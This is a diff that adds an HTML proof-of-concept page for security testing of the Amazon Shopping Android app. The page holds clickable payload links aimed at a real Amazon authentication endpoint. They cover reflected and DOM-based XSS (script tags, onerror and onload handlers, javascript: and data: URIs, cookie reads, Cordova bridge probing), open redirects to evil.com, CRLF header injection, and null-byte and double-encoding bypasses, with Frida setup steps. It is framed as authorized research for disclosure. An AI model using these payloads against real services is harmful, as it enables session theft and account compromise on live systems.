@@ -1,10 +1,457 @@
-<html>
-<body style="background:black;color:#0f0;font-family:monospace">
-<h2>Amazon WebView Test</h2>
-<script>
-  alert("JS running inside Amazon WebView");
-  console.log("document.cookie =", document.cookie);
-  console.log("window keys =", Object.keys(window));
-</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon Shopping App - Security Testing PoC</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 20px;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #232526 0%, #414345 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            opacity: 0.9;
+            font-size: 14px;
+        }
+        
+        .warning {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            padding: 20px;
+            margin: 20px;
+            border-radius: 8px;
+        }
+        
+        .warning h3 {
+            color: #856404;
+            margin-bottom: 10px;
+        }
+        
+        .warning p {
+            color: #856404;
+            line-height: 1.6;
+        }
+        
+        .section {
+            padding: 30px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .section:last-child {
+            border-bottom: none;
+        }
+        
+        .section h2 {
+            color: #333;
+            margin-bottom: 15px;
+            font-size: 22px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .section h2::before {
+            content: "🔍";
+            margin-right: 10px;
+        }
+        
+        .section p {
+            color: #666;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        
+        .test-group {
+            margin-bottom: 30px;
+        }
+        
+        .test-item {
+            background: #f8f9fa;
+            border-left: 4px solid #667eea;
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 6px;
+            transition: all 0.3s ease;
+        }
+        
+        .test-item:hover {
+            background: #e9ecef;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        
+        .test-item h4 {
+            color: #333;
+            margin-bottom: 8px;
+            font-size: 16px;
+        }
+        
+        .test-item code {
+            display: block;
+            background: #2d3748;
+            color: #68d391;
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 12px;
+            margin: 10px 0;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        
+        .test-button {
+            display: inline-block;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 12px 24px;
+            text-decoration: none;
+            border-radius: 6px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+        
+        .test-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4);
+        }
+        
+        .test-button:active {
+            transform: translateY(0);
+        }
+        
+        .severity-critical {
+            border-left-color: #dc3545;
+        }
+        
+        .severity-high {
+            border-left-color: #fd7e14;
+        }
+        
+        .severity-medium {
+            border-left-color: #ffc107;
+        }
+        
+        .badge {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: uppercase;
+            margin-left: 10px;
+        }
+        
+        .badge-critical {
+            background: #dc3545;
+            color: white;
+        }
+        
+        .badge-high {
+            background: #fd7e14;
+            color: white;
+        }
+        
+        .badge-medium {
+            background: #ffc107;
+            color: #333;
+        }
+        
+        .instructions {
+            background: #e3f2fd;
+            border-left: 4px solid #2196f3;
+            padding: 20px;
+            margin: 20px;
+            border-radius: 6px;
+        }
+        
+        .instructions h3 {
+            color: #1565c0;
+            margin-bottom: 10px;
+        }
+        
+        .instructions ol {
+            margin-left: 20px;
+            color: #1565c0;
+        }
+        
+        .instructions li {
+            margin-bottom: 8px;
+            line-height: 1.6;
+        }
+        
+        .footer {
+            background: #f8f9fa;
+            padding: 20px;
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔒 Amazon Shopping Security Testing PoC</h1>
+            <p>Client-Side Validation Bypass - Impact Demonstration</p>
+        </div>
+
+        <div class="warning">
+            <h3>⚠️ Ethical Testing Only</h3>
+            <p>This PoC is for authorized security testing only. These test vectors demonstrate potential vulnerabilities in the Amazon Shopping app's authentication flow. Only test on your own device with the Amazon Shopping app installed.</p>
+        </div>
+
+        <div class="instructions">
+            <h3>📋 Testing Instructions</h3>
+            <ol>
+                <li>Ensure Frida is running on your Android device/emulator</li>
+                <li>Start Frida monitoring script: <code>python3 frida_monitor.py</code></li>
+                <li>Click any test button below on your Android device</li>
+                <li>Observe Frida output for JavaScript execution or error messages</li>
+                <li>Check logcat for additional information: <code>adb logcat | grep -i "webview\|javascript\|xss"</code></li>
+            </ol>
+        </div>
+
+        <div class="section">
+            <h2>Reflected XSS Tests</h2>
+            <span class="badge badge-critical">Critical</span>
+            <p>Testing if the consent page reflects the redirect parameter without proper sanitization, enabling XSS in privileged WebView context.</p>
+            
+            <div class="test-group">
+                <div class="test-item severity-critical">
+                    <h4>Test 1.1: Basic Script Tag</h4>
+                    <code>redirect=https://test&lt;script&gt;alert(1)&lt;/script&gt;.com/amazon.com</code>
+                    <a href="https://link.mobileauth.amazon.com/atb/mshop/v3?redirect=https://test%3Cscript%3Ealert(1)%3C/script%3E.com/amazon.com" class="test-button">
+                        🧪 Test Basic XSS
+                    </a>
+                </div>
+
+                <div class="test-item severity-critical">
+                    <h4>Test 1.2: IMG Tag with onerror</h4>
+                    <code>redirect=https://test"&gt;&lt;img src=x onerror=alert(1)&gt;/amazon.com</code>
+                    <a href="https://link.mobileauth.amazon.com/atb/mshop/v3?redirect=https://test%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E/amazon.com" class="test-button">
+                        🧪 Test IMG XSS
+                    </a>
+                </div>
+
+                <div class="test-item severity-critical">
+                    <h4>Test 1.3: SVG with onload</h4>
+                    <code>redirect=https://test"&gt;&lt;svg/onload=alert(1)&gt;/amazon.com</code>
+                    <a href="https://link.mobileauth.amazon.com/atb/mshop/v3?redirect=https://test%22%3E%3Csvg/onload=alert(1)%3E/amazon.com" class="test-button">
+                        🧪 Test SVG XSS
+                    </a>
+                </div>
+
+                <div class="test-item severity-critical">
+                    <h4>Test 1.4: JavaScript Protocol</h4>
+                    <code>redirect=javascript:alert(document.cookie)//amazon.com</code>
+                    <a href="https://link.mobileauth.amazon.com/atb/mshop/v3?redirect=javascript:alert(document.cookie)//amazon.com" class="test-button">
+                        🧪 Test JavaScript Protocol
+                    </a>
+                </div>
+
+                <div class="test-item severity-critical">
+                    <h4>Test 1.5: Data URI XSS</h4>
+                    <code>redirect=data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;//amazon.com</code>
+                    <a href="https://link.mobileauth.amazon.com/atb/mshop/v3?redirect=data:text/html,%3Cscript%3Ealert(1)%3C/script%3E//amazon.com" class="test-button">
+                        🧪 Test Data URI
+                    </a>
+                </div>
+
+                <div class="test-item severity-critical">
+                    <h4>Test 1.6: Cordova Bridge Access</h4>
+                    <code>redirect=https://test"&gt;&lt;script&gt;if(window.cordova){alert('Cordova:'+JSON.stringify(Object.keys(window.cordova)))}&lt;/script&gt;/amazon.com</code>
+                    <a href="https://link.mobileauth.amazon.com/atb/mshop/v3?redirect=https://test%22%3E%3Cscript%3Eif(window.cordova){alert('Cordova:'+JSON.stringify(Object.keys(window.cordova)))}%3C/script%3E/amazon.com" class="test-button">
+                        🧪 Test Cordova Access
+                    </a>
+                </div>
+
+                <div class="test-item severity-critical">
+                    <h4>Test 1.7: Cookie Theft PoC</h4>
+                    <code>redirect=https://test"&gt;&lt;script&gt;alert('Cookies:'+document.cookie)&lt;/script&gt;/amazon.com</code>
+                    <a href="https://link.mobileauth.amazon.com/atb/mshop/v3?redirect=https://test%22%3E%3Cscript%3Ealert('Cookies:'+document.cookie)%3C/script%3E/amazon.com" class="test-button">
+                        🧪 Test Cookie Access
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>DOM-Based XSS Tests</h2>
+            <span class="badge badge-critical">Critical</span>
+            <p>Testing if client-side JavaScript processes the redirect parameter unsafely.</p>
+            
+            <div class="test-group">
+                <div class="test-item severity-critical">
+                    <h4>Test 2.1: Hash Fragment XSS</h4>
+                    <code>redirect=https://amazon.in#&lt;script&gt;alert(1)&lt;/script&gt;</code>
+                    <a href="https://link.mobileauth.amazon.com/atb/mshop/v3?redirect=https://amazon.in%23%3Cscript%3Ealert(1)%3C/script%3E" class="test-button">
+                        🧪 Test Hash XSS
+                    </a>
+                </div>
+
+                <div class="test-item severity-critical">
+                    <h4>Test 2.2: URL with JavaScript in Fragment</h4>
+                    <code>redirect=https://amazon.in#javascript:alert(1)</code>
+                    <a href="https://link.mobileauth.amazon.com/atb/mshop/v3?redirect=https://amazon.in%23javascript:alert(1)" class="test-button">
+                        🧪 Test Fragment JavaScript
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Parameter Pollution Tests</h2>
+            <span class="badge badge-high">High</span>
+            <p>Testing how the application handles multiple redirect parameters or malformed URLs.</p>
+            
+            <div class="test-group">
+                <div class="test-item severity-high">
+                    <h4>Test 3.1: Multiple Redirect Parameters</h4>
+                    <code>redirect=https://amazon.in&redirect=https://evil.com/amazon.com</code>
+                    <a href="https://link.mobileauth.amazon.com/atb/mshop/v3?redirect=https://amazon.in&redirect=https://evil.com/amazon.com" class="test-button">
+                        🧪 Test Parameter Pollution
+                    </a>
+                </div>
+
+                <div class="test-item severity-high">
+                    <h4>Test 3.2: URL with @ Symbol (Authority Confusion)</h4>
+                    <code>redirect=https://amazon.in@evil.com/amazon.com</code>
+                    <a href="https://link.mobileauth.amazon.com/atb/mshop/v3?redirect=https://amazon.in@evil.com/amazon.com" class="test-button">
+                        🧪 Test Authority Confusion
+                    </a>
+                </div>
+
+                <div class="test-item severity-high">
+                    <h4>Test 3.3: Backslash Confusion</h4>
+                    <code>redirect=https://amazon.in\@evil.com/amazon.com</code>
+                    <a href="https://link.mobileauth.amazon.com/atb/mshop/v3?redirect=https://amazon.in\@evil.com/amazon.com" class="test-button">
+                        🧪 Test Backslash Bypass
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>CRLF Injection Tests</h2>
+            <span class="badge badge-high">High</span>
+            <p>Testing if newline characters can inject HTTP headers or enable response splitting.</p>
+            
+            <div class="test-group">
+                <div class="test-item severity-high">
+                    <h4>Test 4.1: Set-Cookie Header Injection</h4>
+                    <code>redirect=https://amazon.in%0d%0aSet-Cookie:malicious=true</code>
+                    <a href="https://link.mobileauth.amazon.com/atb/mshop/v3?redirect=https://amazon.in%0d%0aSet-Cookie:malicious=true" class="test-button">
+                        🧪 Test Cookie Injection
+                    </a>
+                </div>
+
+                <div class="test-item severity-high">
+                    <h4>Test 4.2: Custom Header Injection</h4>
+                    <code>redirect=https://amazon.in%0d%0aX-Injected:header</code>
+                    <a href="https://link.mobileauth.amazon.com/atb/mshop/v3?redirect=https://amazon.in%0d%0aX-Injected:header" class="test-button">
+                        🧪 Test Header Injection
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Information Disclosure Tests</h2>
+            <span class="badge badge-medium">Medium</span>
+            <p>Testing what information is revealed in error messages for different input types.</p>
+            
+            <div class="test-group">
+                <div class="test-item severity-medium">
+                    <h4>Test 5.1: Internal Domain Test</h4>
+                    <code>redirect=https://internal.amazon.com/amazon.com</code>
+                    <a href="https://link.mobileauth.amazon.com/atb/mshop/v3?redirect=https://internal.amazon.com/amazon.com" class="test-button">
+                        🧪 Test Internal Domain
+                    </a>
+                </div>
+
+                <div class="test-item severity-medium">
+                    <h4>Test 5.2: Localhost Test</h4>
+                    <code>redirect=https://localhost:8080/amazon.com</code>
+                    <a href="https://link.mobileauth.amazon.com/atb/mshop/v3?redirect=https://localhost:8080/amazon.com" class="test-button">
+                        🧪 Test Localhost
+                    </a>
+                </div>
+
+                <div class="test-item severity-medium">
+                    <h4>Test 5.3: IP Address Test</h4>
+                    <code>redirect=https://127.0.0.1/amazon.com</code>
+                    <a href="https://link.mobileauth.amazon.com/atb/mshop/v3?redirect=https://127.0.0.1/amazon.com" class="test-button">
+                        🧪 Test IP Address
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Edge Case Tests</h2>
+            <span class="badge badge-medium">Medium</span>
+            <p>Testing unusual input patterns and edge cases in URL parsing.</p>
+            
+            <div class="test-group">
+                <div class="test-item severity-medium">
+                    <h4>Test 6.1: Unicode Normalization</h4>
+                    <code>redirect=https://αmazon.com/amazon.com (Greek alpha)</code>
+                    <a href="https://link.mobileauth.amazon.com/atb/mshop/v3?redirect=https://αmazon.com/amazon.com" class="test-button">
+                        🧪 Test Unicode Bypass
+                    </a>
+                </div>
+
+                <div class="test-item severity-medium">
+                    <h4>Test 6.2: Null Byte Injection</h4>
+                    <code>redirect=https://amazon.in%00.evil.com/amazon.com</code>
+                    <a href="https://link.mobileauth.amazon.com/atb/mshop/v3?redirect=https://amazon.in%00.evil.com/amazon.com" class="test-button">
+                        🧪 Test Null Byte
+                    </a>
+                </div>
+
+                <div class="test-item severity-medium">
+                    <h4>Test 6.3: Double Encoding</h4>
+                    <code>redirect=https://amazon.in%252f..%252fevil.com/amazon.com</code>
+                    <a href="https://link.mobileauth.amazon.com/atb/mshop/v3?redirect=https://amazon.in%252f..%252fevil.com/amazon.com" class="test-button">
+                        🧪 Test Double Encoding
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p><strong>Security Research PoC</strong> | Amazon Shopping Android App | November 2025</p>
+            <p>For authorized security testing only | Responsible Disclosure</p>
+        </div>
+    </div>
 </body>
 </html>
